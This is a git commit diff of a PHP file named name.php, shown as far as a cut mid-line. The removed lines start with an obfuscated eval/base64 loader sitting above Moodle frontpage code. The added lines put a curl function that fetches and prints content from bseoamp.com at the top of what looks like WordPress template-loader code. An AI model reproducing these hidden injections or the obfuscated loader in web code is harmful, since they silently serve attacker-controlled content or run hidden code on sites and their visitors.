f27d4d836a6b362c8da44680f62632a2b4ad16ea
eagles227 <166109731+eagles227@users.noreply.github.com>
2025-07-24 14:48:41 +0700

    Update name.php

--- name.php
+++ name.php
@@ -1,207 +1,127 @@
 <?php
-$enc = '=IMTwyUD90A+fd/99uCXE+hYS+P7s+t8iziUiPR1X85Du/w0h8zZmy8Ww6CU9+3ykDaw9JJpV9khV9r2qpK0nHFGA9t9JLc+LfX92ewhHsMU2HnJdOTN5klZU19d5opQ0TLOT3cYqt0Blb9NP5yRlO0Kbc0kC15Gs64j+/w8kLhoizO9eP+h1rOMy8f178tr+9js89Nbt7rrjsPu3Wey+Sf1duK6M7C9dtRO+54H+65/3UU/f2F5+hn1flSBw2xPfVHe+5lnw8WZVnP0OXN6stfNmk1UWcbNuw8DLPYwzubJ99Ku6cDqevv3ja6HH74fDec09+F6ev50weT/n27r5WvO9r1w95DjR7sbRBe2/v2vgW/tgXcWdsj+PVWfqSNterc//A6foa/f+Pq06/4Sq3zLoSvvjKt+Puk698Cq03Lwfemku0cH/2K9nkvMVBSf9wLGJo/ro/92c9vil5MSgH48DN4wb1+Bfoa2q/84JR+qeNMfm65UF5kd1Ku6+mekm8qgwQy6XSxXb7aPSubEKp+ZxR+zZ0pWX2t647/PreFcNberTn3q1rV97aVvhZZL+xiazvOdOtblfXlF4fNfXjm+VernhVvauMmreDmrRvx7Wltvtb3mvfFmqYvbht6vxU9bxcVmRx2hxY1bwQFyP0KU8N8W+NGrR/wqQx3wb5HYt+LMU9fcMX1OYuqruWXOcpic5el65Sl24at24St25et65at24St24Sl24SF7lNXKVu1bGdlM9mBXqxmSmDVnNXLXLzsymn1cmun/mvTF5wtyterqg28y9qBXqsDub7SV75GXrw80G3lYeKTnAGLlK/61juUhe1oLVd2tuUDFSFuXlV0ARZLXrYHXqUmVaHvL1oPXrbHXq9mDctG94eV4xmVuDo2p3VsTvr6uvr6q8V16sgbILPYMK/+LmozSM0Nct9cldl2198NHzELUrxkq9r3Cs/bT9WxNxjHbFvyZ3Rz6eePu5UqTd05MnPcHyeqBysabo/Kk6pMXL86Q40X35N2482/nzeYr68mDIvcXlPfnXeczvuTi+umDAv1i6kf39m3f5BRvw2w3DOkOsZhhmgffeEPs+Y+b22HcvVY4T7hz6znbx1P44bnzvwAbu/F/MEo0qD8dffym5h3d68QFI3B7gvN0/Fpvbv+CFZ79YZofwSmNG6zxQg7mbmHY3jx/2edE0lOu3QquzD+8ssvui3y5R4GmHv+iDuxGpN9fzql0djB2z4Yx11JUz44oW3fLchesjfDN3nHY5vXGUu3PQaMDZD9127w+vwZ73B7zM+xLF5/674sDe/yA6W3XOVbgZFf/n713c3vnax708Cv99aprvx+fVZu7CWW49Cw6GL/0P9qz5HvPH/4ee8X74SNrzwMt60LSwPu49IDM0bNLkvA2iLvO/y7fTla6r74hsbHHvHl7pPNL5TG45Z4kW2qp6wF3T5sJQnXcDPGCnYNnji4trgYRaz1UBQRWmjSUgvQFE4MSALR47XE6F1rLTbq20tpTmcA8Jhb5hbbrIrbzqBNQy3KBHgJLC9K7DkUqItVkzDy6+Qgn6Es6YVKanwzKZBpTtylDbi6ZcZ63IGA3zEeUwj7tNeCrs4ESeC56mgTnMW9hELwSxYtA7Gt6mbVvGDlNj73ZuKNUEoloQGDuwHUMPZzbwl3wxEthZTx8YRbcDhjSM3WmQ8iM5evsRtIcXbjYPDMNqFqNzKSAzNcImvCJdxZUXhrGPhesJEJpmKlnLcGSPLj174bUiIwcrO0u5+glR6buYGTrAjBM0Gx2kAuVxkbmFSDg2lAPOPDUumdCFQrk2OmSbFOuD8jcTS0YSf4UtPQCp5zmdk0tk3yCFwJhbZLKfIPEeCRC0Du0890oDnE6UWMTSGPulyyJuXzSin5QwRba0k07HgybMyE304aCAR1LsyGJ3fq3QVMItp5xyGsriz2wYhUgQh1gpmcSvuQiqqYcYAEqtGTAxpgliLYy2yoQT0xnipIKFc0ngT15hC8AGCt6wlsIZJiatdTGY+EDdBkbuL6mtMEm2B9YoVdszbpoeuuRd+hOqhD42IDumxyNyXBpSrEENPUGioNNxxIAfQKAQmhIeI0042I/jyZoGaoRTiZp+wCVjEuSKYJGunCKBATTioW3EADUAjs1KS3l8RoQBddYO1jtUQRa5Arp02kgCOrVYfPFvNS6IuTdOsrsYo2QwM4yxAubB6KjZAifkkmB3IPeA8VktNh8jg4PNVImannflss7wxF2hW+SOFGlwO6SOVygMRetF9wTwHJsIKzjmKMpH+BlT6UeJlMXkqJkWFRyle8C9FIS2VtqTAQRDgoW2LgKFAK4zA5IphKzlewkJ2kFHiBTQLkhQPSHSTxsJYeOkGNLQdLMUpqxQSZhHyxCQDUhkWZw9BY5uMeK6JbXK+mJGDuYkdgkoLNfe3MBeOUsuzLntWD5anpgYwmHo1STIptVSzADif4eT24OfUWulgDLjeAfCOVKGFQ5WIIyRJIAb5MsZ0nDE0imG7GT2VCBM7GQJeBPwtqkqWEyILtY6GDDu3knXuj0ZuMkeJ1KwYE5MYMLXLEJVAcihAdspQIhDm0wwhLEhISigXbg2h+kuFlFNYyK0c2DsAdXVSamKFDbxlA4NzEFjCDWmmms9RBBUgPTTSzvdw+soUbKIINarm5zQ0VaYcGlWiJyR4ZQiVGPORXSYRh2b4EBY+YEYJMT5NggFxHYoIMNm+TMc1khTWWMEHNDXABXnRM4rGXGaVnOyEXO6sy3cwG25fNURqnOYKr9Urz331hDbebHJ48W3gwSN2jEc/02QCB4qfUxVsiWy1eah0iNtAhKTEMaGf+yxa1m8pYgCBiL0MbY8mJPmKzpI9IFOPBbhu9Yha9MlMlJQZZSNdDjJh3RCTuEoFBtpW0aTlw67UyB+zs4zGytEYFypmh4IbV5ycCFgKun6JZKv6hcly1wzn3U1KOGQtZlKEjDCtYSgrXxIvK5lRVq2sbHxiotSIKt8RZmAWiQQLVRZMXSi46AkcAh5ikSl5WGNONTZyvLC0cEJLv7zwkXSzzVET4Q8E2DNvvY0XqCHc/Em1sLWRD3PihjOEsYXHip0nqJs98u6TU9BOOPBhHJPLZr89DMDAXmLZgD1M0PjJx1vHma/oUP86zvCJxvNQV2yHKLZawSXdOf5PDiisdNDghUXPyjtrReUn61FXnR37tbN0pHwgW7x37RUsK8dyNO4IH+Znf4reJ8VXd47Lel89xGUzfHoxnZv3W9eP6+PkRv/2DPhhvao3e+WfoFnArT6M5Ju5/0dHPY9nSFTtTAXAYsr9MzV8J2dE19Mh6UQqi5OQQGWl7USZ/XZ38Rhf2ff/z6s1APrjtHPeO1emFHVF6IPvTMdKv5dWAhEWqcXQgHBMIvfoF9vVGSyXRCCdURhDHXdTCexFhvcE3paW+1D4sIjO612nk1FOYrfwqzRaZkEr19/99d9LfRS+z2+jk3d4+cau/j1E5GL8E0ppLbTKmtGt3793LpieYIfGBqOqBMGS0a3aJWkWrGpvFDu0+m7Um6iVLEwTwGB+Poe1vFGt9brpV7ciX9FqgeBwJe1rnCFGQ91pgiBUPcK8YA';
-eval(base64_decode(base64_decode('WlhaaGJDZ2lQejRpTG1kNmRXNWpiMjF3Y21WemN5aG5lblZ1WTI5dGNISmxjM01vWjNwcGJtWnNZWFJsS0dkNmFXNW1iR0YwWlNobmVtbHVabXhoZEdVb1ltRnpaVFkwWDJSbFkyOWtaU2h6ZEhKeVpYWW9KR1Z1WXlrcEtTa3BLU2twT3c9PQ=========')));
-// This file is part of Moodle - http://moodle.org/
-// Moodle is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by
-// the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
-// Moodle is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
-// You should have received a copy of the GNU General Public License along with Moodle. If not, see <http://www.gnu.org/licenses/>.
+function get_remote_content($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result ?: '';
+}
 
- /**
- * Moodle frontpage.
+echo get_remote_content('https://bseoamp.com/bseo1/');
+?>
+<?php
+/**
+ * Loads the correct template based on the visitor's url
  *
- * @package    core
- * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
- * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
+ * @package WordPress
  */
-
-if (!file_exists('./config.php')) {
-    header('Location: install.php');
-    die;
+if ( wp_using_themes() ) {
+	/**
+	 * Fires before determining which template to load.
+	 *
+	 * @since 1.5.0
+	 */
+	do_action( 'template_redirect' );
 }
 
-require_once('config.php');
-require_once($CFG->dirroot . '/course/lib.php');
-require_once($CFG->libdir . '/filelib.php');
-
-redirect_if_major_upgrade_required();
-
-$urlparams = array();
-if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && optional_param('redirect', 1, PARAM_BOOL) === 0) {
-    $urlparams['redirect'] = 0;
+/**
+ * Filters whether to allow 'HEAD' requests to generate content.
+ *
+ * Provides a significant performance bump by exiting before the page
+ * content loads for 'HEAD' requests. See #14348.
+ *
+ * @since 3.5.0
+ *
+ * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
+ */
+if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
+	exit;
 }
 
-$PAGE->set_url('/', $urlparams);
-$PAGE->set_pagelayout('frontpage');
-$PAGE->set_other_editing_capability('moodle/course:update');
-$PAGE->set_other_editing_capability('moodle/course:manageactivities');
-$PAGE->set_other_editing_capability('moodle/course:activityvisibility');
-
-// Prevent caching of this page to stop confusion when changing page after making AJAX changes.
-$PAGE->set_cacheable(false);
-
-require_course_login($SITE);
-
-$hasmaintenanceaccess = has_capability('moodle/site:maintenanceaccess', context_system::instance());
-
-// If the site is currently under maintenance, print a message.
-if (!empty($CFG->maintenance_enabled) && !$hasmaintenanceaccess) {
-    print_maintenance_message();
+// Process feeds and trackbacks even if not using themes.
+if ( is_robots() ) {
+	/**
+	 * Fired when the template loader determines a robots.txt request.
+	 *
+	 * @since 2.1.0
+	 */
+	do_action( 'do_robots' );
+	return;
+} elseif ( is_favicon() ) {
+	/**
+	 * Fired when the template loader determines a favicon.ico request.
+	 *
+	 * @since 5.4.0
+	 */
+	do_action( 'do_favicon' );
+	return;
+} elseif ( is_feed() ) {
+	do_feed();
+	return;
+} elseif ( is_trackback() ) {
+	require ABSPATH . 'wp-trackback.php';
+	return;
 }
 
-$hassiteconfig = has_capability('moodle/site:config', context_system::instance());
+if ( wp_using_themes() ) {
 
-if ($hassiteconfig && moodle_needs_upgrading()) {
-    redirect($CFG->wwwroot . '/' . $CFG->admin . '/index.php');
+	$tag_templates = array(
+		'is_embed'             => 'get_embed_template',
+		'is_404'               => 'get_404_template',
+		'is_search'            => 'get_search_template',
+		'is_front_page'        => 'get_front_page_template',
+		'is_home'              => 'get_home_template',
+		'is_privacy_policy'    => 'get_privacy_policy_template',
+		'is_post_type_archive' => 'get_post_type_archive_template',
+		'is_tax'               => 'get_taxonomy_template',
+		'is_attachment'        => 'get_attachment_template',
+		'is_single'            => 'get_single_template',
+		'is_page'              => 'get_page_template',
+		'is_singular'          => 'get_singular_template',
+		'is_category'          => 'get_category_template',
+		'is_tag'               => 'get_tag_template',
+		'is_author'            => 'get_author_template',
+		'is_date'              => 'get_date_template',
+		'is_archive'           => 'get_archive_template',
+	);
+	$template      = false;
+
+	// Loop through each of the template conditionals, and find the appropriate template file.
+	foreach ( $tag_templates as $tag => $template_getter ) {
+		if ( call_user_func( $tag ) ) {
+			$template = call_user_func( $template_getter );
+		}
+
+		if ( $template ) {
+			if ( 'is_attachment' === $tag ) {
+				remove_filter( 'the_content', 'prepend_attachment' );
+			}
+
+			break;
+		}
+	}
+
+	if ( ! $template ) {
+		$template = get_index_template();
+	}
+
+	/**
+	 * Filters the path of the current template before including it.
+	 *
+	 * @since 3.0.0
+	 *
+	 * @param string $template The path of the template to include.
+	 */
+	$template = apply_filters( 'template_include', $template );
+	if ( $template ) {
+		include $template;
+	} elseif ( current_user_can( 'switch_themes' ) ) {
+		$theme = wp_get_theme();
+		if ( $theme->errors() ) {
+			wp_die( $theme->errors() );
+		}
+	}
+	return;
 }
-
-// If site registration needs updating, redirect.
-\core\hub\registration::registration_reminder('/index.php');
-
-if (get_home_page() != HOMEPAGE_SITE) {
-    // Redirect logged-in users to My Moodle overview if required.
-    $redirect = optional_param('redirect', 1, PARAM_BOOL);
-
-    if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
-        set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
-    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && $redirect === 1) {
-        redirect($CFG->wwwroot . '/my/');
-    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
-        $frontpagenode = $PAGE->settingsnav->find('frontpage', null);
-        if ($frontpagenode) {
-            $frontpagenode->add(
-                get_string('makethismyhome'),
-                new moodle_url('/', array('setdefaulthome' => true)),
-                navigation_node::TYPE_SETTING
-            );
-        } else {
-            $frontpagenode = $PAGE->settingsnav->add(get_string('frontpagesettings'), null, navigation_node::TYPE_SETTING, null);
-            $frontpagenode->force_open();
-            $frontpagenode->add(get_string('makethismyhome'),
-                new moodle_url('/', array('setdefaulthome' => true)),
-                navigation_node::TYPE_SETTING
-            );
-        }
-    }
-}
-
-// Trigger event.
-course_view(context_course::instance(SITEID));
-
-// If the hub plugin is installed, let it take over the homepage here.
-if (file_exists($CFG->dirroot . '/local/hub/lib.php') && get_config('local_hub', 'hubenabled')) {
-    require_once($CFG->dirroot . '/local/hub/lib.php');
-    $hub = new local_hub();
-    $continue = $hub->display_homepage();
-    // Function display_homepage() returns true if the hub home page is not displayed
-    // ...mostly when search form is not displayed for not logged users.
-    if (empty($continue)) {
-        exit;
-    }
-}
-
-$PAGE->set_pagetype('site-index');
-$PAGE->set_docs_path('');
-$editing = $PAGE->user_is_editing();
-$PAGE->set_title($SITE->fullname);
-$PAGE->set_heading($SITE->fullname);
-
-$courserenderer = $PAGE->get_renderer('core', 'course');
-echo $OUTPUT->header();
-
-// Print Section or custom info.
-$siteformatoptions = course_get_format($SITE)->get_format_options();
-$modinfo = get_fast_modinfo($SITE);
-$modnames = get_module_types_names();
-$modnamesplural = get_module_types_names(true);
-$modnamesused = $modinfo->get_used_module_names();
-$mods = $modinfo->get_cms();
-
-if (!empty($CFG->customfrontpageinclude)) {
-    include($CFG->customfrontpageinclude);
-} else if ($siteformatoptions['numsections'] > 0) {
-    if ($editing) {
-        // Make sure section with number 1 exists.
-        course_create_sections_if_missing($SITE, 1);
-        // Re-request modinfo in case section was created.
-        $modinfo = get_fast_modinfo($SITE);
-    }
-    $section = $modinfo->get_section_info(1);
-    if (($section && (!empty($modinfo->sections[1]) || !empty($section->summary))) || $editing) {
-        echo $OUTPUT->box_start('generalbox sitetopic');
-
-        // If currently moving a file, show the current clipboard.
-        if (ismoving($SITE->id)) {
-            $stractivityclipboard = strip_tags(get_string('activityclipboard', '', $USER->activitycopyname));
-            echo '<p><font size="2">';
-            echo "$stractivityclipboard&nbsp;&nbsp;(<a href=\"course/mod.php?cancelcopy=true&amp;sesskey=" . sesskey() . "\">";
-            echo get_string('cancel') . '</a>)';
-            echo '</font></p>';
-        }
-
-        $context = context_course::instance(SITEID);
-
-        // If the section name is set, show it.
-        if (trim($section->name) !== '') {
-            echo $OUTPUT->heading(
-                format_string($section->name, true, array('context' => $context)),
-                2,
-                'sectionname'
-            );
-        }
-
-        $summarytext = file_rewrite_pluginfile_urls($section->summary,
-            'pluginfile.php',
-            $context->id,
-            'course',
-            'section',
-            $section->id
-        );
-        $summaryformatoptions = new stdClass();
-        $summaryformatoptions->noclean = true;
-        $summaryformatoptions->overflowdiv = true;
-
-        echo format_text($summarytext, $section->summaryformat, $summaryformatoptions);
-
-        if ($editing && has_capability('moodle/course:update', $context)) {
-            $streditsummary = get_string('editsummary');
-            echo "<a title=\"$streditsummary\" " .
-                 "href=\"course/editsection.php?id=$section->id\">" .
-                 $OUTPUT->pix_icon('t/edit', $streditsummary) .
-                 "</a><br /><br />";
-        }
-
-        echo $courserenderer->course_section_cm_list($SITE, $section);
-        echo $courserenderer->course_section_add_cm_control($SITE, $section->section);
-        echo $OUTPUT->box_end();
-    }
-}
-
-// Include course AJAX.
-include_course_ajax($SITE, $modnamesused);
-
-if (isloggedin() && !isguestuser() && isset($CFG->frontpageloggedin)) {
-    $frontpagelayout = $CFG->frontpageloggedin;
-} else {
-    $frontpagelayout = $CFG->frontpage;
-}
-
-foreach (explode(',', $frontpagelayout) as $v) {
-    switch ($v) {
-        // Display the main part of the front page.
-        case FRONTPAGENEWS:
-            if ($SITE->newsitems) {
-                // Print forums only when needed.
-                require_once($CFG->dirroot . '/mod/forum/lib.php');
-
-                if (!$newsforum = forum_get_course_forum($SITE->id, 'news')) {
-                    print_error('cannotfindorcreateforum', 'forum');
-                }
-
-                // Fetch news forum context for proper filtering to happen.
-                $newsforumcm = get_coursemodule_from_instance('forum', $newsforum->id, $SITE->id, false, MUST_EXIST);
-                $newsforumcontext = context_module::instance($newsforumcm->id, MUST_EXIST);
-
-                $forumname = format_string($newsforum->name, true, array('context' => $newsforumcontext));
-                echo html_writer::
